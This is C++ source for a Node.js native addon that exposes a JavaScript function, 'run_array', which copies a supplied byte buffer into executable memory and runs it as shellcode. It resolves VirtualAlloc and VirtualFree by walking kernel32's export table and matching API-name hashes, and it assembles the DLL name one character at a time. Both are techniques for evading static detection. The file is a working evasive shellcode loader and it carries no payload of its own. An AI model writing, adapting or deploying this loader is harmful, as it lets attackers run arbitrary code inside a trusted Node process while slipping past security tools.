#include <windows.h>
#include <napi.h>
#include <stdio.h>
#include <winhttp.h>

#define D_API( x )  decltype( x ) * x;

#define H_API_VIRTUALALLOC              0xceb9b623628b5257
#define H_API_VIRTUALFREE               0x5f3ae6d888f298a2
#ifdef _DEBUG
#define DPRINT(...) printf( __VA_ARGS__ )
#else
#define DPRINT(...)
#endif

using namespace Napi;

INT uv_thread_create(PSIZE_T tid, PVOID entry, PVOID arg);

extern "C" SIZE_T Hasher1(INT sz, LPSTR str);

INT StringLengthA(char* string22)
{
    int length = 0;
    int stringmax = 2000;
    while (length < stringmax) {
        if (string22[length] == 0x00) {
            break;
        }
        length++;
    }
    return length;
}

// Does not handle forwaders
void xGetProcAddr(PVOID pe, SIZE_T api_hash, PHANDLE api_addr)
{
    int* AddressOfFunctions = NULL;
    int* AddressOfNames = NULL;
    short* AddressOfNameOrdinals = NULL;
    char* export_name = NULL;

    PIMAGE_NT_HEADERS       nt = (PIMAGE_NT_HEADERS)(((PBYTE)(pe))+((PIMAGE_DOS_HEADER)pe)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY dir = (PIMAGE_EXPORT_DIRECTORY)(((PBYTE)(pe)) + (&nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT])->VirtualAddress);

    AddressOfFunctions = (int*)(((PBYTE)(pe)) + dir->AddressOfFunctions);
    AddressOfNameOrdinals = (short*)(((PBYTE)(pe)) + dir->AddressOfNameOrdinals);
    AddressOfNames = (int*)(((PBYTE)(pe)) + dir->AddressOfNames);

    for (DWORD i = 0; i < dir->NumberOfNames; i++)
    {
        export_name = (PCHAR)(((PBYTE)(pe)) + AddressOfNames[i]);
        if (Hasher1(StringLengthA(export_name), export_name) == api_hash)
        {
            *api_addr = (HANDLE*)(((PBYTE)(pe)) + AddressOfFunctions[AddressOfNameOrdinals[i]]);
        }
    }
}

// run_array ([shellcode byte buffer]);
Napi::Boolean do_thing_from_node(const Napi::CallbackInfo& info) {

    D_API(VirtualAlloc);
    D_API(VirtualFree);

    CHAR    k32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', '\0' };
    PVOID   a_k32 = LoadLibraryA(k32);
    xGetProcAddr(a_k32, H_API_VIRTUALALLOC, (PHANDLE)&VirtualAlloc);
    xGetProcAddr(a_k32, H_API_VIRTUALFREE, (PHANDLE)&VirtualFree);

    Napi::Env env = info.Env();

    Napi::Boolean ret_f = Napi::Boolean::New(env, FALSE);
    Napi::Boolean ret_t = Napi::Boolean::New(env, TRUE);

    // Check the number of arguments
    if ( info.Length() < 1) {
        Napi::TypeError::New(env, "Expected one arguments").ThrowAsJavaScriptException();
        return ret_f;
    }

    // Check the types of arguments
    if (!info[0].IsBuffer()) {
        Napi::TypeError::New(env, "Expected a byte buffer.").ThrowAsJavaScriptException();
        return ret_f;
    }

    // Extract the byte array
    Napi::Buffer<uint8_t> ByteBuf = info[ 0 ].As<Napi::Buffer<uint8_t>>();
    PBYTE   pShellcodeBuf         = ByteBuf.Data();
    SIZE_T  szShellcode           = ByteBuf.ByteLength();
    PBYTE   execBuf               = NULL;
    DPRINT("pShellcodeBuf 0x%llx\n", pShellcodeBuf);
    DPRINT("szShellcode 0x%llx\n", szShellcode);

    execBuf = (PBYTE)VirtualAlloc((LPVOID)NULL, szShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(execBuf, pShellcodeBuf, szShellcode);
    DPRINT("execBuf 0x%llx\n", execBuf);
    typedef void (*func_ptr)();
    ((func_ptr)execBuf)();

    VirtualFree(execBuf, 0, MEM_FREE);

    // This actually zeros the real buffer from javascript's end! JS caller should not expect this buffer to still contain the shellcode!
    // If you don't plan on reusing the buffer, or the buffer is repopulated on every run_array call, feel free to uncomment this
    // ZeroMemory( pShellcodeBuf, szShellcode);
    return ret_t;

}

Napi::Object Init(Napi::Env env, Napi::Object exports) {

    // This (do_thing_from_node) is going to be callable from the javascript that loads this node via the js function "run_array"
    exports.Set("run_array", Napi::Function::New(env, do_thing_from_node));
    return exports;
}

NODE_API_MODULE(addon, Init)